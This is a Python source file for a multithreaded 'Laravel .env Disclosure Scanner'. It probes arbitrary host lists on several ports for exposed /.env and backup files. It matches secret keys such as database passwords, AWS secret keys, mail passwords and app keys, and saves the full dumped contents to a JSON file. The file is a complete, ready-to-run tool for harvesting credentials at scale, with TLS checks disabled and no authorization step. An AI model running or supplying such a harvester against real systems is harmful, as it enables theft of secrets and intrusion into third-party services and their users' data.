# Author: ni30mi5hr4

import socket
import requests
import concurrent.futures
import re
import urllib3
import json
import os
import argparse
from colorama import Fore, Style, init
from threading import Lock

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ======================= Banner ========================
def print_banner():
    banner = f"""
{Fore.CYAN}
 ███████╗███╗   ██╗██╗   ██╗
 ██╔════╝████╗  ██║██║   ██║
 █████╗  ██╔██╗ ██║██║   ██║
 ██╔══╝  ██║╚██╗██║██║   ██║
 ███████╗██║ ╚████║╚██████╔╝
 ╚══════╝╚═╝  ╚═══╝ ╚═════╝ 

   {Style.BRIGHT}{Fore.GREEN}Laravel .env Disclosure Scanner
         by ni30mi5hr4
{Style.RESET_ALL}
    """
    print(banner)

# ======================= Regex Pattern ========================
ENV_VAR_PATTERN = re.compile(
    r'\b(?:APP_NAME|APP_ENV|APP_KEY|APP_DEBUG|APP_URL|ASSET_URL|PUBLIC_ROOT|LOG_CHANNEL|'
    r'LOG_DEPRECATIONS_CHANNEL|LOG_LEVEL|DB_CONNECTION|DB_HOST|DB_PORT|DB_DATABASE|'
    r'DB_USERNAME|DB_PASSWORD|BROADCAST_DRIVER|CACHE_DRIVER|FILESYSTEM_DISK|QUEUE_CONNECTION|'
    r'SESSION_DRIVER|SESSION_LIFETIME|MEMCACHED_HOST|REDIS_HOST|REDIS_PASSWORD|REDIS_PORT|'
    r'SESSION_DOMAIN|MAIL_MAILER|MAIL_HOST|MAIL_PORT|MAIL_USERNAME|MAIL_PASSWORD|MAIL_ENCRYPTION|'
    r'MAIL_FROM_ADDRESS|MAIL_FROM_NAME|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_DEFAULT_REGION|'
    r'AWS_BUCKET|AWS_USE_PATH_STYLE_ENDPOINT|PUSHER_APP_ID|PUSHER_APP_KEY|PUSHER_APP_SECRET|'
    r'PUSHER_HOST|PUSHER_PORT|PUSHER_SCHEME|PUSHER_APP_CLUSTER|MIX_PUSHER_APP_KEY|'
    r'MIX_PUSHER_APP_CLUSTER|SCOUT_DRIVER|WORDPRESS_BASE_URL|WORDPRESS_API_KEY)\s*=\s*["\']?.+?["\']?(?:\n|$)'
)

COMMON_ENDPOINTS = [
    "/.env", "/.env.backup", "/.env.old", "/backup/.env", "/laravel/.env", "/public/.env"
]

lock = Lock()
stats = {
    "total_scanned": 0,
    "total_hits": 0,
    "total_failures": 0
}

# ======================= Core Logic ========================
def is_port_open(host, port):
    try:
        with socket.create_connection((host, port), timeout=1):
            return True
    except Exception:
        return False

def contains_env_variables(content):
    return ENV_VAR_PATTERN.search(content) is not None

def extract_env_keys(content):
    matches = ENV_VAR_PATTERN.findall(content)
    return list(set([m.split('=')[0] for m in matches]))

def check_endpoints(host):
    for proto in ["http://", "https://"]:
        for path in COMMON_ENDPOINTS:
            url = f"{proto}{host}{path}"
            try:
                response = requests.get(url, timeout=3, verify=False, allow_redirects=True)
                if response.status_code == 200 and contains_env_variables(response.text):
                    return {
                        "url": url,
                        "status_code": response.status_code,
                        "keys": extract_env_keys(response.text),
                        "env_dump": response.text.strip()
                    }
            except requests.RequestException:
                continue
    return None

def scan_and_check_endpoints(host, ports, output_file):
    with lock:
        stats["total_scanned"] += 1

    for port in ports:
        if is_port_open(host, port):
            port_suffix = f":{port}" if port not in [80, 443] else ""
            target = f"{host}{port_suffix}"
            result = check_endpoints(target)
            if result:
                with lock:
                    stats["total_hits"] += 1
                    with open(output_file, "a") as file:
                        json.dump(result, file, indent=2)
                        file.write("\n")
                print(f"{Fore.GREEN}[FOUND] {result['url']} | Keys: {', '.join(result['keys'])}")
                return
    with lock:
        stats["total_failures"] += 1

# ======================= Entry Point ========================
def main():
    print_banner()

    parser = argparse.ArgumentParser(description="Laravel .env Disclosure Scanner (ENVSCANNER) by ni30mi5hr4")
    parser.add_argument("-i", "--input", required=True, help="Path to input file (e.g. ips.txt)")
    parser.add_argument("-o", "--output", required=True, help="Path to output JSON file")
    parser.add_argument("--threads", type=int, default=200, help="Number of concurrent threads (default: 200)")
    parser.add_argument("--ports", default="80,443,8080", help="Comma-separated list of ports (default: 80,443,8080)")

    args = parser.parse_args()

    input_file = args.input
    output_file = args.output
    ports = [int(p.strip()) for p in args.ports.split(",") if p.strip().isdigit()]
    max_threads = args.threads

    if not os.path.exists(output_file):
        open(output_file, "w").close()

    try:
        with open(input_file, "r") as file:
            targets = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Input file not found: {input_file}")
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(scan_and_check_endpoints, host, ports, output_file) for host in targets]
        concurrent.futures.wait(futures)

    print(f"\n{Fore.CYAN}📊 Scan Summary:")
    print(f"{Fore.WHITE} - Total Scanned  : {stats['total_scanned']}")
    print(f"{Fore.GREEN} - Total Hits     : {stats['total_hits']}")
    print(f"{Fore.RED} - Total Failures : {stats['total_failures']}")
    print(f"\n{Fore.CYAN}✅ Results saved to: {output_file}")

if __name__ == "__main__":
    main()
